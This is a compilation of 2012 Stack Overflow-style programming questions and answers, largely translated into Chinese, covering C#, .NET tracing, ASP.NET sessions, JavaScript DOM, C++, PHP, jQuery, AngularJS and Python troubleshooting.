> 
> 时间：2012-09-25T17:00:12.483
> 
> 标签：c#, ssis

我正在尝试创建我的第一个数据流组件，它将获取输入地址通过 PAF api 运行它并从文件源或数据库表中吐出格式正确的地址和原始输入列。

我需要以特定格式提供源输入地址，因此我需要用户将源输入列映射到特定的自定义输入列。我能够使用 input.ExternalMetadataColumnCollection 创建自定义输入列，这很有效。但是，现在有人告诉我，我现在需要提供将源文件中的所有可用列作为输出列包含在内的选项。

我已尝试创建出现在“列映射”选项卡中的其他输入列，但并非所有源输入列都可用。以下是我迄今为止尝试过的。任何建议将不胜感激。所以我的问题是如何添加额外的自定义输入列以及包括所有源列？

```
 IDTSExternalMetadataColumnCollection100 externalInput = input.ExternalMetadataColumnCollection;
        externalInput.IsUsed = true;

        IDTSExternalMetadataColumn100 externalInputColumn = externalInput.New();
        externalInputColumn.Name = constInputAddressLineOne;
        externalInputColumn.DataType = DataType.DT_WSTR;

        externalInputColumn = externalInput.New();
        externalInputColumn.Name = constInputAddressLineTwo;
        externalInputColumn.DataType = DataType.DT_WSTR; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T09:49:18.470

我找到了一种方法。如果您能提出更好的方法，我会全力以赴。我只需要将我的自定义输入列名称设置为只读。我用了以下。

```
 public override void OnInputPathAttached(int inputID)
    {
        IDTSInput100 input = ComponentMetaData.InputCollection[0];

        IDTSVirtualInput100 vInput = input.GetVirtualInput();

        IDTSExternalMetadataColumnCollection100 externalColumnCollection = input.ExternalMetadataColumnCollection;
        IDTSExternalMetadataColumn100 externalColumn;                

        foreach (IDTSVirtualInputColumn100 vCol in vInput.VirtualInputColumnCollection)
        {            
            externalColumn = externalColumnCollection.New();
            externalColumn.Name = vCol.Name;
            externalColumn.DataType = vCol.DataType;               
        }
    } 
```

# c# - 将跟踪侦听器附加到 app.config 中的现有跟踪源

> ID：12587713
> 
> 赞同：1
> 
> 时间：2012-09-25T17:00:14.493
> 
> 标签：c#, .net, app-config, tracelistener, tracesource

我在我的代码中创建了一个具有特定名称的跟踪源，然后我想使用 app.config 中的部分在运行时将侦听器附加到它。

这是我的 app.config：

```
 <system.diagnostics>
    <trace autoflush="true"/>
    <sources>
      <source name="myTraceSource"
              switchName="mySwitch"
              switchType="System.Diagnostics.SourceSwitch" >
        <listeners>
          <clear/>
          <add name="textwriterListener"
            type="System.Diagnostics.TextWriterTraceListener"
            initializeData="c:\dev\mylog.txt"
            traceOutputOptions="ProcessId, DateTime, Callstack" />
        </listeners>
      </source>
    </sources>
    <switches>
      <add name="mySwitch" value="Verbose" />
    </switches>
  </system.diagnostics> 
```

我可以看到代码中正在生成消息

```
this.TraceSource.TraceEvent(TraceEventType.Verbose, 0, p_message); 
```

但日志文件中没有任何内容（甚至没有创建）。当我设置断点并查看时`this.TraceSource.Listeners`，它是空的。

知道我在这里做错了什么，或者关于调试这类事情的任何提示吗？甚至可以将新的侦听器附加到这样的现有源吗？

我也尝试了以下但没有成功：

```
 <system.diagnostics>
   <trace autoflush="true" indentsize="4">
     <listeners>
       <add name="TextListener" 
           type="System.Diagnostics.TextWriterTraceListener"
           initializeData="c:\dev\mylog.txt" />
       <remove name="Default" />
     </listeners>
   </trace>
 </system.diagnostics> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-25T17:49:17.540

我看到的一种可能性是您在配置文件中指定的目录是否不存在。也就是说，您没有显示如何初始化 TraceSource 实例，因此我不确定它与此无关。在任何情况下，使用配置部分的简单控制台应用程序都可以正常工作。

```
class Program
{
    static TraceSource ts = new TraceSource("myTraceSource");

    static void Main(string[] args)
    {
        ts.TraceEvent(TraceEventType.Verbose, 0, "Hello");
    }
} 
```

另外，请确保您的 app.config 是完整的。我假设您只发布了 System.Diagnostics 部分，但这是完整的示例：

```
<?xml version="1.0" encoding="utf-8" ?>
<configuration>
  <system.diagnostics>
    <trace autoflush="true"/>
    <sources>
      <source name="myTraceSource"
              switchName="mySwitch"
              switchType="System.Diagnostics.SourceSwitch" >
        <listeners>
          <clear/>
          <add name="textwriterListener"
            type="System.Diagnostics.TextWriterTraceListener"
            initializeData="c:\dev\mylog.txt"
            traceOutputOptions="ProcessId, DateTime, Callstack" />
        </listeners>
      </source>
    </sources>
    <switches>
      <add name="mySwitch" value="Verbose" />
    </switches>
  </system.diagnostics>
</configuration> 
```

# c# - cookie/session 似乎在瘦客户端环境中被覆盖

> ID：12587714
> 
> 赞同：0
> 
> 时间：2012-09-25T17:00:15.250
> 
> 标签：c#, asp.net-mvc, cookies, thin-client

我有一个 asp.net mvc 网页，将我的员工 ID 存储在会话状态，但是当 2 名员工在同一时间范围内访问时，它似乎被覆盖或混淆了。我花了 2 个小时在谷歌上搜索答案，但没有找到。我自己不熟悉瘦客户端，所以我想知道会话状态在这种情况下是如何工作的。如果同一用户登录到服务器/瘦客户端，他们是否共享相同的 cookie 会话状态？我的替代方案是什么？我们一遍又一遍地为我们的瘦客户端使用相同的通用用户...

我不使用任何静态实例。示例：Session["EmployeeId"] = model.Employee.Id; 模型的非静态类。– 瘦客户端使用的是 Windows XP Embedded。用户确实使用了不同的浏览器实例，但两个实例的 Windows 通用用户名仍然相同。没有代理。

因为我使用的是默认会话状态，所以它使用了 cookie，因此不同的实例仍然看到相同的 cookie 并获得相同的会话。由于这是 MVC，我无法真正更改为 url 驱动，因为这会扰乱我的路由，并且必须为此做大量工作......请任何人有任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-01T12:57:24.593

我最终实施的解决方案是：Session["EmployeeId" + model.Employee.Id] = model.Employee.Id。这使每个用户对我来说都是独一无二的。虽然这并不理想，但它确实解决了我的问题。

# c# - c# 使用控制台应用程序打开pdf

> ID：12587722
> 
> 赞同：-3
> 
> 时间：2012-09-25T17:01:05.947
> 
> 标签：c#, pdf, console

我是 C# 的新手。我想知道如何使用控制台应用程序逐步打开 pdf 文件。需要导入哪些类以及应该添加哪些引用。谢谢你的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-25T17:03:53.833

您可能想看看使用[Process.Start Method (String)](http://msdn.microsoft.com/en-us/library/53ezey2s%28v=vs.100%29.aspx)

> 通过指定文档或应用程序文件的名称来启动流程资源，并将该资源与新的流程组件相关联。

另外，也许看看重载方法[Process.Start Method](http://msdn.microsoft.com/en-us/library/system.diagnostics.process.start%28v=vs.100%29.aspx)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-25T17:14:19.467

如果您是从控制台应用程序打开它，那么只需编写代码

```
Process p=new Process();
p.StartInfo.FileName = @"G:\Test.pdf";
p.Start(); 
```

为此，您必须使用 System.Diagnostics；

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-25T17:16:28.567

[PDFsharp](http://www.pdfsharp.com/)是一个用于处理 PDF 文件的 .NET 库。

# javascript - Javascript - DOM 中的错误？

> ID：12587723
> 
> 赞同：0
> 
> 时间：2012-09-25T17:01:07.700
> 
> 标签：javascript, html, dom

所以我完成了一个使用 DOM 获取数据的项目。一切都很好，我的代码通过了代码审查。然而，在我实现一项新功能后的一天，我的代码坏了。我拿走了我没有接触过的损坏的代码，并在 W3C 学校的测试地点复制了它，可以在这里找到。

[http://www.w3schools.com/dom/tryit.asp?filename=try_dom_nodelist_item](http://www.w3schools.com/dom/tryit.asp?filename=try_dom_nodelist_item)

只需将我的代码复制到那里并运行它。当您期望看到“5”时，您得到的输出为“2”，因为表中显然有五行。希望有大神能解答一下这个问题。提前致谢。

***一些更可能有用的信息：我也在 Visual Studios 中运行它并调试它以查看发生了什么。显然，无论你放多少行，它总是会吐出 2，而且它吐出的两个对象都是空的。这有多奇怪？？***

```
<!DOCTYPE html>
<html>
<head>
</script>
</head>
<body>
            <h2><i>Albums</i></h2> 
            <table cellspacing="0" border="4" id = "table" class = "lazyProgressiveLoad">
                <tr style="font-style: italic; font-size: small; font-family: Segoe UI Light; color: Navy">
                    <th>--Id--</th>
                    <th>--Name--</th>
                    <th>--Description--</th>
                    <th><input type="button" value="Add Album" onclick="alert('Guru's Please Help!!!')" id = "addAlbum"/></th>
                </tr>
                <tr>
                    <td>Load, Search, or Add Albums to Get Started!</td>
                    <td>~~~</td>
                    <td>~~~</td>
                    <td>~~~</td>
                </tr>
                <tr>
                    <td>Load, Search, or Add Albums to Get Started!</td>
                    <td>~~~</td>
                    <td>~~~</td>
                    <td>~~~</td>
                </tr>
                <tr>
                    <td>Load, Search, or Add Albums to Get Started!</td>
                    <td>~~~</td>
                    <td>~~~</td>
                    <td>~~~</td>
                </tr>
                <tr>
                    <td>Load, Search, or Add Albums to Get Started!</td>
                    <td>~~~</td>
                    <td>~~~</td>
                    <td>~~~</td>
                </tr>
                <tr>
                </tr>
            </table>
<script>
window.onload = function () {
alert(parseInt(document.getElementById("table").childNodes.length));
}

</script>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-25T17:03:53.997

不，这不是 DOM 中的错误。您的`table`HTML 没有`tbody`，因此浏览器会自动插入它。这两个节点可能是`tbody`和一个文本节点。

检查的简单方法是记录`childNodes`.

```
console.log(document.getElementById("table").childNodes); 
```

或者单独记录它们。

```
var table = document.getElementById("table");
console.log(table.childNodes[0], table.childNodes[1]); 
```

您可以通过该`.rows`属性直接访问所有表格行。

```
document.getElementById("table").rows 
```

或者通过`tBodies`收藏。

```
document.getElementById("table").tBodies[0].rows 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-25T17:05:14.520

而不是`childNodes`尝试`rows`

```
alert(parseInt(document.getElementById("table").rows.length)); 
```

它应该得到正确的行。你也不必使用`parseInt`因为`.length`返回`integer`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-25T20:01:07.927

我现在知道为什么我的程序中有这个错误。我原本 .children 曾经遍历我的 DOM 树，并且在某个时候，当我在我的程序中实现延迟加载时，.children 神奇地变成了 .childNodes ... 这破坏了我的代码，因为 .children 完全不同来自 .childNodes....

因此，这就是要摆脱的：

1) .rows -> 只给你一个表的所有行

2) .childNodes -> 为您提供直接子节点，甚至为您自动插入的子节点

3) .children -> 行为类似于行的功能，但它也适用于其他所有内容

# c++ - how to call descendant function from a base class?

> ID：12587726
> 
> 赞同：1
> 
> 时间：2012-09-25T17:01:17.837
> 
> 标签：c++

I have a question for this scheme:

```
class computer_mouse
{
    left_click() { };
    track_wheel() { };
    right_click() { };
}

class game_mouse: public computer_mouse
{
    double_shot() { };
    throw_grenade() { };
    sit_down() { };
}

class design_mouse: public computer_mouse
{
    increase_zoom() { };
    decrease_zoom() { };
}

class computer
{
    computer_mouse *my_mouse;
} 
```

I want to do this:

```
computer_mouse *my_mouse = new game_mouse();
my_mouse->double_shot(); 
```

How can I call a descendant function from a base class?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-25T17:05:19.990

You have to use e.g. [`static_cast`](http://en.wikipedia.org/wiki/Static_cast) for that:

```
computer_mouse *my_mouse = new game_mouse();

static_cast<game_mouse*>(my_mouse)->double_shot(); 
```

From the above linked Wikipedia page:

> The static_cast operator can be used for operations such as
> 
> *   Converting a pointer of a base class to a pointer of a derived class,

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-25T17:09:49.847

By using `static_cast`:

```
static_cast<game_mouse*>(my_mouse)->double_shot(); 
```

However, the methods should be public, and not private!

```
class game_mouse: public computer_mouse
{
public:
    double_shot() { };
    throw_grenade() { };
    sit_down() { };
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-25T17:12:21.970

Don't do this:

```
computer_mouse *my_mouse = new game_mouse();
my_mouse->double_shot(); 
```

Do this:

```
game_mouse *my_mouse = new game_mouse();
my_mouse->double_shot(); 
```

# c# - 在向用户显示之前更改 WebBrowser 中的 HTML？

> ID：12587728
> 
> 赞同：28
> 
> 时间：2012-09-25T17:01:22.500
> 
> 标签：c#, web, browser

我正在使用 WebBrowser 控件，我想在 HTML 代码显示在控件中之前对其进行操作。

例如打开网站A，内容如下：

```
<html>
  <body>
    <p id="Text">Hello</p>
  </body>
</html> 
```

我想把它改成

```
<html>
  <body>
    <p id="Text">Bye</p>
  </body>
</html> 
```

我知道我可以使用 DocumentCompleted 事件来做到这一点，然后对其进行操作。但是，如果网站执行了在 Document ready 事件上执行的 JavaScript 内容，那么更改它就没有意义，因为它已经被执行了。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2013-01-07T07:01:12.280

您可以在[`Navigated`](http://msdn.microsoft.com/en-us/library/system.windows.forms.webbrowser.navigated.aspx)事件中进行 DOM 操作：

```
webBrowser1.Navigated += (sender, e) =>
{
    ((WebBrowser)sender).Document.GetElementById("Text").InnerHtml = "Bye";
}; 
```

这将在文档中的任何 DOM 就绪处理程序之前执行。例如，如果您最初有以下 HTML：

```
<html>
<head>
    <title>Test</title>
</head>
<body onload="document.getElementById('Text').innerHTML = document.getElementById('Text').innerHTML + ' modified';">
    <p id="Text">Hello</p>
</body>
</html> 
```

当您在 WebBrowser 中显示此代码时，您将获得`Bye modified`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-08-21T14:23:12.413

这不起作用。我面临同样的问题。如果你想修改ajax调用怎么办？导航方法永远不会触发。此外，导航方法永远不会在 iFrame 上触发。

我认为唯一的解决方案是使用代理。只需单击添加 NuGet 包。搜索提琴手核心。添加对[http://www.telerik.com/fiddler/fiddlercore](http://www.telerik.com/fiddler/fiddlercore)的引用后。现在只需对如何使用 FiddlerCore 修改响应进行谷歌搜索。我相信会有很多例子。

**注意：**默认情况下启动提琴手核心时，它将更改您的计算机代理设置。你不希望出现这种情况！您只希望您的网络浏览器控件连接到它，而不是您的整个系统。因此初始化 fiddlel 核心以在随机端口进行侦听，而无需作为系统代理启动。然后将您的网络浏览器控件设置为连接到该代理。

尝试访问 HTTPS 站点时会变得更加棘手：/

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-08-28T01:02:45.560

您可以在`setInterval`回调中以合理的间隔（约 20 毫秒）执行此操作，然后在适当的时间清除间隔，例如在 DOM 准备好时。

唯一需要注意的是，您的回调需要是幂等的，因为它会被多次调用。如果您只是将数据属性或类名添加到您已经修改过的 DOM 节点，我认为这不会很困难，这样它们就不会再次被修改。

# c++ - 我可以以某种方式将 Maple 程序包含到 C++ 代码中吗

> ID：12587729
> 
> 赞同：1
> 
> 时间：2012-09-25T17:01:28.817
> 
> 标签：c++, numerical-methods, maple

我有一个数学问题，用 Maple 解决，但必须用 C++ 解决。问题是我找不到其中一个方程的数值方法（它是用内置的枫树“求解”程序求解的）。我能否以某种方式将此过程包含在我的代码中，或者找到显示 Maple 数值方法的完整描述的地方。该方程是一个复杂的代数方程组。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2018-07-14T11:22:34.760

你说你已经解决了 Maple 方程，所以我假设你确实有解析解。为什么你需要一个数字呢？[从此处](https://www.maplesoft.com/support/help/maple/view.aspx?path=CodeGeneration%2FC)记录的解决方案生成 C 代码，仔细查看并将其复制粘贴到您正在开发的 C++ 程序中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T21:04:20.363

好吧，我假设在求解时您有 z、n、x、t 的值，以及第二个术语中的 ksi 值。如果是这样，我建议使用准牛顿法，其中一些列在这里

[准牛顿维基](http://en.wikipedia.org/wiki/Quasi-Newton_method)。

生成的数学当然可以用 C++ 编码，而且我确信外部存在一些实现。

我提出这个建议的原因是你的系统（我不确定我是否看到一个系统？只是一个非线性函数）是非线性的，只有在你做出良好的初步猜测时，牛顿法才会有用。在给定任何初始条件的情况下，即使速度很慢，大多数也可以保证收敛。

除非你编码不当哈哈

编辑 2：关于编辑 1 的 NVM。这是一个价格标签 lol

* * *

编辑：您也许可以使用这个具有 C++ 钩子的计算库（然后这听起来像是一个作业，所以也许您不能）：

[NAG 图书馆](http://en.wikipedia.org/wiki/NAG_Numerical_Library)

# javascript - 同源策略、google chrome、canvas 和 file:// 方案

> ID：12587731
> 
> 赞同：4
> 
> 时间：2012-09-25T17:01:35.583
> 
> 标签：javascript, html, google-chrome, cross-domain

当尝试从预先绘制图像的画布中读取图像数据时，Google Chrome 会引发跨源异常（抱怨画布被“污染”）。目录结构如下。

```
/html/base/path
|-- index.html         contains the canvas element, references the script.js
|-- script.js          loads imgs/images.jpg, paints and queries the canvas
`-- imgs/image.jpg 
```

仅当页面由 file:// 方案加载时才会发生错误。

我想知道这是否是 Chrome 错误。如果不是，适用哪些规则？有什么解决方法吗？

不幸的是，离线观看是最终的用例，所以

*   file:// 方案是必不可少的
*   无法控制目标系统上的浏览器设置。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-25T17:03:14.063

加载的文件`file://`始终被认为来自不同的域，这是您无法绕过的功能。

根据[HTML5 规范对 Origin 的定义](http://www.w3.org/TR/html5/origin-0.html#origin-0)：

> 如果以其他方式获取文档（例如数据：用户输入的 URL、使用 createDocument() API 创建的文档等），则源是创建文档时分配的全局唯一标识符。

如果加载协议是`file:`.

* * *

**在你的情况下我**可能会做什么（如果我从你的评论中理解正确的话）：我会写一个小程序，可以在外部存储介质中发布，它会启动一个 http 服务器并启动一个 web 浏览器。**我**会在 Go 中完成（简单地用两三行代码创建一个 http 服务器，为 linux、Mac 和 Windows 进行本地编译，使您能够提供所有需要的可执行文件）但也可以使用其他语言。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-25T17:24:57.023

给他们指示，让他们使用 flag 启动 chrome [`--allow-file-access-from-files`](http://peter.sh/experiments/chromium-command-line-switches/)。

除此之外，他们需要运行本地服务器实例以避免错误。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-10-20T21:31:02.653

这是实践中新的 Chromium 安全策略。除了按上述 epascarello 禁用此策略外，您无能为力。Star this [bug](http://code.google.com/p/chromium/issues/detail?id=47416)，他们有点希望放松这个规则。

也检查[这个](https://stackoverflow.com/questions/3102819/chrome-disable-same-origin-policy)答案。

# yii - 每当文本字段更改时，如何在 Yii 中提交表单？

> ID：12587739
> 
> 赞同：0
> 
> 时间：2012-09-25T17:02:09.867
> 
> 标签：yii, form-submit, onchange, keyboard-events

我实际上是在使用 Yii 框架编写一个网站。我有几个表的视图，每个表都包含一个具有唯一 ID 的表单。每个表格都有一个`textfield`, 和 2 `dropdownlists`。每个表单必须在`textfield` `onkeyup`事件触发时和每个`dropdownlist` `onchange`事件被触发时提交。

请注意，对于`onkeyup`事件，您必须等待大约 500 毫秒才能提交表单。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T21:46:09.657

只写js函数。

```
$('input[type=text]').keyup(function(){
   setInterval(function(){
     $(this).closest("form").submit();
      },500);
})

$("select").change(function(){
    $(this).closest("form").submit();
}) 
```

我建议您为 input[type=text] 和下拉菜单设置相同的类。所以选择会更容易。

# php - 如果我通过变量传递值，php for 不起作用

> ID：12587740
> 
> 赞同：0
> 
> 时间：2012-09-25T17:02:12.763
> 
> 标签：php, xml, for-loop

我正在用`simplexml_load_file()`函数解析 XML 数据，当我使用 for 循环显示数据时，它的显示从我提到的数字到限制正确

```
<?php
for($i=10; $i<=20; $i++){
{
 $offer->name;
}
?> 
```

但是当我通过变量声明值时它不起作用。

```
<?php
$result_start = $_REQUEST['start'];
$result_limit = $_REQUEST['limit'];

for($i=$result_start; $i<=$result_limit; $i++){
{
 $offer->name;
}
?> 
```

这里发生的另一件奇怪的事情是循环重复了 2 次。就像我提到从 10 到 20 的循环一样，它向我展示了从 10 到 22 的值。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-25T17:10:49.240

在我看来，这个问题最容易通过将用户输入转换为整数来解决：

```
$result_start = (int) $_REQUEST['start'];
$result_limit = (int) $_REQUEST['limit']; 
```

# jquery - jQuery gMap 2 - 将 html 添加到内容：行

> ID：12587756
> 
> 赞同：0
> 
> 时间：2012-09-25T17:03:27.520
> 
> 标签：jquery, html, xhtml, jquery-gmap3

我正在完成的网站上使用 gMap，作为 gMap 网站的示例，我使用以下方法；

```
 $('#map').gMap('addMarker',
    {
        latitude: 0,
        longitude: 0,
        content: 'Some HTML content'
    }
); 
```

在 content: 'some HTML content' 行中，我添加了一行 html，包括一个 img 和一个 div 文本。像这样'

```
content: '<img src="img/shop.jpg" alt="shopfront" /><div id="map-text"><h2>Elan Hair Design</h2><p>17 Woodgate, Rothley,<br />Leicestershire. XXXXXXX</p><h3>T: XXXXXXXXX</h3></div>' 
```

这一切看起来和工作都很好，但是当我在 xhtml strict 下验证时，我收到关于在 content: '' 行中添加 img 和 div 标签的错误。

我是否误解了可以添加到该区域的 html 类型？还是我做错了。

任何帮助都会受到极大的欢迎。

韦恩

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T17:46:57.787

如果您在 XHTML 文档中有 javascript，则嵌入它的正确方法如下：

```
<script type="text/javascript">
/* <![CDATA[ */
// content of your Javascript goes here
/* ]]> */
</script> 
```

请参阅[**此处**](http://javascript.about.com/library/blxhtml.htm)以获取解释。

# jquery - jQuery datepicker + Rails 3.2.8 + AngularJS：显示和保留日期问题

> ID：12587765
> 
> 赞同：5
> 
> 时间：2012-09-25T17:04:02.143
> 
> 标签：jquery, ruby-on-rails, json, datepicker, angularjs

我很难让三合会 rails+angularjs+jQuery datepicker 一起工作。

第一个问题是显示从后端检索到的日期。当 UI 从后端请求数据时，在某些时候，它会以 JSON 表示法接收以下内容。

```
{"id":1,"ragione_sociale":"FrigoCaserta srl","indirizzo":"Strada provinciale Gricignano d'Aversa","cap":"81030","citta":"Gricignano d'Aversa","provincia":"CE","partita_iva":"1234","codice_fiscale":null,"tipo_contratto":"Orario","costo":"0.0","inizio":"2012-05-01","fine":"2013-09-22","$$hashKey":"005"} 
```

相关字段是“inizio”和“fine”（分别是开始日期和结束日期）。

Rails 时区设置为欧洲/罗马。

Datepicker 的选项设置为：{dateFormat: 'dd/mm/yy'}

因此，我希望输入字段将“inizio”日期显示为：01/05/2012，但相反，我返回：24/03/2018。

将 dateFormat 选项更改为 'yy-mm-dd' 显示正确的日期，但带有不需要的分隔符和格式 (2012-05-01) ...

然而，在幕后发生的事情是，显示的对象受到了一些操纵，变成了这样：

```
{"id":1,"ragione_sociale":"FrigoCaserta srl","indirizzo":"Strada provinciale Gricignano d'Aversa","cap":"81030","citta":"Gricignano d'Aversa","provincia":"CE","partita_iva":"1234","codice_fiscale":null,"tipo_contratto":"Orario","costo":"0.0","inizio":"2012-04-30T22:00:00.000Z", ... 
```

请注意，“inizio”字段现在从“2012-05-01”转换为“2012-04-30T22:00:00.000Z”

现在，当我将表单提交到后端时，一切都会失败，因为 rails 接收到由 datepicker 格式化的“inizio”的新值。只是一个 Date 的数据库字段使有关时间的信息消失了，剩下的只是持久化到模型中的（错误的）日期。

我知道 datepicker 具有本地化选项，但我找不到任何与时区相关的内容，我可以更改以修复这种不需要的行为。

我以为我可以使用后端模型上的属性来解析来自 UI 的信息，但我不喜欢这种方法。

处理所有这些时要遵循的最佳做法是什么？

我已经通过 StackOverflow 类似的问题没有运气。

在此先感谢您的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-20T22:58:54.830

一旦这个拉取请求进入核心，它应该会更容易，因为资源将支持一个解码器，可以在其中完成这个字符串到日期的转换。 [https://github.com/angular/angular.js/pull/1514](https://github.com/angular/angular.js/pull/1514)

# iphone - 多张图片 UITable 视图

> ID：12587773
> 
> 赞同：2
> 
> 时间：2012-09-25T17:04:46.810
> 
> 标签：iphone, ios, uitableview

我有我的图像逐行。我想在我的表格视图中加载图像

[http://pinterest.com/](http://pinterest.com/)

是否有可能或者我们想使用其他视图来实现这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T06:36:21.433

您可以为 iOS 使用 BDDynamicGridViewController

在行主导的网格布局中显示 UIView 列表（通常是 UIImageView 列表）的数据感知视图控制器。此类在委托类（由您提供）的帮助下自动布置 UIView。你可以在[这里](http://www.cocoacontrols.com/platforms/ios/controls/bddynamicgridviewcontroller)找到它。希望它有帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-01T23:14:40.593

另请参阅 UICollectionView 的[JSPintDemo](https://github.com/jayslu/JSPintDemo)布局。

![在此处输入图像描述](../Images/efd5e4c129a3d5d046ef0fa95dcaffe7.png)

# c++ - 没有调用析构函数

> ID：12587774
> 
> 赞同：0
> 
> 时间：2012-09-25T17:04:53.927
> 
> 标签：c++

根据：[http ://www.cplusplus.com/doc/tutorial/classes/](http://www.cplusplus.com/doc/tutorial/classes/)

析构函数完成了与构造函数相反的功能。当对象被销毁时会自动调用它，因为它的存在范围已经结束（例如，如果它被定义为函数内的本地对象并且函数结束）或者因为它是动态分配的对象并且被释放使用运算符删除。

示例代码：

```
 class Something
    {
    public:
        Something() {cout << "construction called" << endl; }
        ~Something()    { cout << "destruction called" << endl; }
    };

    void foo(){
        Something *ob = new Something();
    }

    int _tmain(int argc, _TCHAR* argv[])
    {
        foo();
    } 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-25T17:06:24.220

没错，但是您在**动态内存**中分配对象，这意味着它不会被破坏，直到您调用`delete`.

> 因为它是一个动态分配的对象，并且是使用操作符 delete 释放的。

你永远不会调用删除。因此内存泄漏和未调用的析构函数：

```
void foo(){
    Something *ob = new Something();
    delete ob;
} 
```

要么这样，要么只是在**自动内存**中分配对象：

```
void foo(){
    Something ob;
} 
```

或将内存管理委托给智能指针。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-09-25T17:06:35.667

在对象被销毁之前调用析构函数。由于您使用 分配了对象，因此您必须手动显式销毁它并通过调用指向该对象的指针来`new`释放它占用的内存。`delete`

如果您在自动存储中创建了对象，à la

```
Something ob; 
```

该对象将被自动销毁，并且在返回时对象超出范围时将调用析构函数`foo`。

# python - AttributeError：“模块”对象没有属性“get_combos”

> ID：12587775
> 
> 赞同：2
> 
> 时间：2012-09-25T17:04:58.380
> 
> 标签：python, methods, module, attributeerror

大家好，这是我运行 python 文件时的问题

```
execfile("create_revdict.py") 
```

我明白了

```
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "create_revdict.py", line 91, in <module>
    combos =  QuickSky.get_combos(det_keys)
AttributeError: 'module' object has no attribute 'get_combos' 
```

但是当我查看 QuickSky 模块时，它是从我发现的 pyc 文件中导入的

```
help(QuickSky)

FILE
    /Users/alessandromanzotti/Downloads/FindSkyArea/QuickSky.pyc

CLASSES
__builtin__.object
    Mapper

class Mapper(__builtin__.object)
 |  This is a Mapper class to map the timedelays to the 
 |  keys
 |  
 |  Methods defined here:
 |  
 |  __init__(self, dets, timescope=10000)
 |  
 |  convert_bin_time(self, bin)
 |  
 |  convert_time_bin(self, t)
 |  
 |  create_combo_error(self, error_dict)
 |  
 |  create_dict(self, grid_size, func_time_dict, *args)
 |      Create the actual reverse dictionary
 |      @param grid_size: grid size in radians
 |      @param func_time_dict: function to return the time dict 
 |                            for a given sky position. 
 |                            fun(lon, lat)
 |  
 |  create_key(self, timedelay_dict)
 |      Create a key from the time delay dict
 |  
 |  create_key_list(self, timedelay_dict, error_dict)
 |      Create a bunch of keys including the errors
 |      @params timedelay_dict: timedelay betwen the different sites
 |      @params error_dict: the individual detector timing errors
 |  
 |  create_key_list_ellipse(self, timedelay_dict, error_dict)
 |  
 |  get_combos(self)
 |      Create all possible combinations from the det_keys list, 
 |      in alphabetical order
 |  
 |  get_point_area_sqd(self)
    get_points(self, listkeys)
 |  
 |  ----------------------------------------------------------------------
 |  Data descriptors defined here:
 |  
 |  __dict__
 |      dictionary for instance variables (if defined)
 |  
 |  __weakref__
 |      list of weak references to the object (if defined)
 FUNCTIONS
 define_network(det_keys, flow=10.0)
    Creates the detector network to use
    @param det_keys: list of detectors to be included in the network
    @param flow: The lower cutoff frequency [Hz] 
```

所以看起来 QuickSky 有一个属性 get_combos。

不幸的是，我没有编写 QuickSky.pyc，所以我无法访问 QuickSky.py 源代码。

错误可能是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T17:09:35.183

正如消息告诉您的那样，`get_combos`它不是模块的功能`QuickSky`。您可以使用 . 检查该模块的内容`dir(QuickSky)`。

它看起来像是类`get_combos`的方法`QuickSky.Mapper`。您可能需要使用适当的`dets`参数创建后者的实例。

# c++ - 二维数组的模板和结构

> ID：12587778
> 
> 赞同：1
> 
> 时间：2012-09-25T17:05:08.883
> 
> 标签：c++, templates, static, struct, constants

我正在尝试使用模板和结构制作一个*二维数组结构容器*，这是我的代码：

```
// T = 2darray type; LIN = lines count; COL = cols count
template <class T, int LIN, int COL>
struct Matrix {
    T val[LIN][COL];
    static const int linCount = LIN;
    static const int colCount = COL;
    static const int size = LIN*COL;
}; 
```

我的编译器告诉我将“静态常量”放在结构成员中，它可以工作，但是作为静态成员，它们会共享给我创建的所有结构实例吗？

*   如果不是，为什么？
*   如果是，是否有另一种方法可以在没有*全局成员共享*的情况下做到这一点？

# c# - 如何更改 GridView 中单个项目的背景

> ID：12587781
> 
> 赞同：1
> 
> 时间：2012-09-25T17:05:12.220
> 
> 标签：c#, xaml, microsoft-metro, windows-runtime, winrt-xaml

我有一个包含多个项目的 GridView（10 个项目从列表中绑定）。并且（举个简单的例子）让我有一个文本字段和按钮。在文本字段中，我将键入从 0 到 9 的数字。当我单击按钮时，我想更改项目的背景，并在文本字段中键入索引。因此，当我键入 0 时，我希望第一项更改背景等。我有一个全局列表，我可以从该列表中获取对象，但我不知道如何在 gridview 上更改该项目的背景

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T17:09:27.787

